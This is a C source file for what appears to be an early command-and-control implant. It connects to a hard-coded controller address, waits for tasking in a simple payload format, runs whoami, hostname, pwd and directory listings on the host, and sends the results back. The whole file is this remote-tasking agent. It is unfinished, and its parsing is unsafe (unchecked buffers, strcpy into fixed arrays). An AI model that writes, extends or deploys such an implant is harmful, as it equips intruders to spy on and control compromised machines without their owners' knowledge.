#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <dirent.h>
#include <errno.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#define IP "127.0.0.1"
#define PORT_HTTP 80

//networked part
void networking();

//executing command
char *executing(char *receive, char *arg);

//whoami command
char *whoamiCommand();

//hostname command
char *hostnameCommand();

//pwd command
char *pwdCommand();

//ls command
char *lsCommand(char *arg);

int main() {
    networking();
}

void networking() {
    //socket http
    printf("Initializing socket...\n");
    int inferno_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

    //preparing http address
    struct sockaddr_in c2_address;
    memset(&c2_address, 0, sizeof(c2_address));
    c2_address.sin_family = AF_INET;
    c2_address.sin_port = htons(PORT_HTTP);
    c2_address.sin_addr.s_addr = inet_addr(IP);

    //connect http
    printf("Connecting...\n");
    int inferno_connect = connect(inferno_socket, (struct sockaddr *) &c2_address, sizeof(c2_address));
    if (inferno_connect == -1) 
        printf("Please be sure server port: %d is open\n", PORT_HTTP);
    puts("Connected");
    
    while (1) {
    	//receiving http payload
    	char receive[1024];
    	int inferno_receive = recv(inferno_socket, receive, 1024, 0);
    	printf("Receiving:\n\n%s\n\n", receive);
        
        //copying original payload
        char receive_copy[1024];
        strcpy(receive_copy, receive);
  
        //parsing to extract payload
        char *content_length = strstr(receive_copy, "{'payload':");
        content_length += strlen("{'payload':");
        char *command_start = strtok(content_length, "'");
        char *command = strtok(command_start, "'");

        //copying original payload
        char receive_copy2[1024];
        strcpy(receive_copy2, receive);

        //parsing to extract argument
        char *content_length_arg = strstr(receive_copy2, ",'argument':");
        char *arg;
        if (content_length_arg != NULL) {
            content_length_arg += strlen(",'argument':");
            char *arg_start = strtok(content_length_arg, "'");
            arg = strtok(arg_start, "'");
        }

        //executing payload
        char response[1024];
        char *task;
        if (content_length_arg == NULL)
            task = executing(command, NULL);
        else
            task = executing(command, arg);    

        sprintf(response, "%s\r\n", task);
        printf("Executing: '%s'\n", command);

    	//sending payload result
    	printf("Sending: '%s' from agent...\n", response);
    	ssize_t inferno_send = send(inferno_socket, response, sizeof(response), 0);
    	printf("Sent:\n\n'%s' from agent...\n", response);
    }
}

char *executing(char *receive, char *arg) {
    char *task;

    //execute whoami
    if (strcmp(receive, "whoami") == 0) {
        task = whoamiCommand();

    //execute hostname
    } else if (strcmp(receive, "hostname") == 0) {
        task = hostnameCommand();

    //execute pwd
    } else if (strcmp(receive, "pwd") == 0) {
        task = pwdCommand();
    
    // execute ls
    } else if (strcmp(receive, "ls") == 0) {
        task = lsCommand(arg);

    //payload not yet build
    }else {
        task = "NULL";
    } return task;
}

//whoami syscall
char *whoamiCommand() {
    char *username = getlogin();
    return username;
}

//hostname syscall
char *hostnameCommand() {
    static char hostname[1024];
    gethostname(hostname, 1024);
    return hostname;
}

//pwd syscall
char *pwdCommand() {
    static char directory[1024];
    getcwd(directory, 1024);
    return directory;
}

//ls syscall
char *lsCommand(char *arg) {
    char *error;
    if (arg == NULL)
        arg = ".";
    char *buf = malloc(1024 * sizeof(char));
    DIR *dirp = opendir(arg);
    if (dirp == NULL) {
        error = "Cannot open directory";
        return error;
    }

    struct dirent *list;
    sprintf(buf, "Size\tName\n");
    sprintf(buf + strlen(buf), "====\t====\n");
    while ((list = readdir(dirp)) != NULL) {
        sprintf(buf + strlen(buf), "%d\t%s\t\n", list->d_reclen, list->d_name);
    }
    return buf;
}
